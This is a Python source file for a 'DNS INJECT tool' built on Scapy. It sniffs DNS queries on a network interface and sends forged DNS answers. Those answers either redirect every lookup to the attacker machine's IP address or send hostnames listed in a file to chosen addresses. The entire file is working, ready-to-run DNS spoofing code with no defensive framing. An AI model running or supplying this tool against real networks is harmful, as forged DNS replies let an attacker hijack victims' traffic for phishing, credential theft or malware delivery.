from scapy.all import *
import socket
import argparse
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(("8.8.8.8", 80))
local_ip = sock.getsockname()[0]
sock.close()


hostname_ip = {}


## DNS Injection
def dns_inject(packet):

    if packet.haslayer(DNSQR) and packet[DNS].qr is 0 and packet[DNSQR].qtype is 1:

        if h_flag == 0:
            # let us create and send a response packet
            echo = IP(src=packet[IP].dst, dst=packet[IP].src) \
                   / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) \
                   / DNS(id=packet[DNS].id, qr=1, ancount=1, aa=1, qd=packet[DNS].qd,
                         an=DNSRR(rrname=packet[DNSQR].qname.decode('utf-8'), rdata=local_ip, ttl=10))
            send(echo)
            print('\n')
            print(echo.command())
        else:
            # check packet[DNSQR].qname for any match in hostnames file and then form a packet
            if packet[DNSQR].qname.decode('utf-8') in hostname_ip.keys():
                value = hostname_ip[packet[DNSQR].qname.decode('utf-8')]
                echo = IP(src=packet[IP].dst, dst=packet[IP].src) \
                       / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) \
                       / DNS(id=packet[DNS].id, qr=1, ancount=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(rrname=packet[DNSQR].qname.decode('utf-8'), rdata=value, ttl=10))
                send(echo)
                print('\n')
                print(echo.command())

def cli_parser():
    parser = argparse.ArgumentParser(description="DNS INJECT tool",add_help=False)
    parser.add_argument("-i")
    parser.add_argument("-h")
    parser.add_argument('expression',nargs='*')
    args=parser.parse_args()
    return args.i,args.h,args.expression


if __name__ == '__main__':
    i_flag=0
    h_flag=0
    e_flag=0
    interface, hostname_file, expression = cli_parser()
    try:
        if interface:
            i_flag=1
            print('')
            print("Interface specified: " + interface)
        else:
            print('')
            print("No interface specified, selecting a default interface.")

        if hostname_file:
            h_flag=1
            print(hostname_file)
            with open(hostname_file) as f:
                for line in f:
                    x = line.split()
                    hostname_ip[x[1]+"."] = x[0]
            print(hostname_ip)

        else:
            print("No hostnames file specified, forging replies for all requests with local machine's IP as an answer.")

        if expression:
            #e_flag=1
            exp_as_str = " ".join(expression)
            print("BPF filter specified: " + exp_as_str)
            bpf = exp_as_str + " and udp port 53"
        else:
            bpf = "udp port 53"
            print("No BPF filter specified.")

        if i_flag == 1:
            sniff(filter=bpf, iface=interface, prn=dns_inject, store=0)
        else:
            sniff(filter=bpf, prn=dns_inject, store=0)


    except AttributeError:
        print("Invalid command line arguments")
        sys.exit()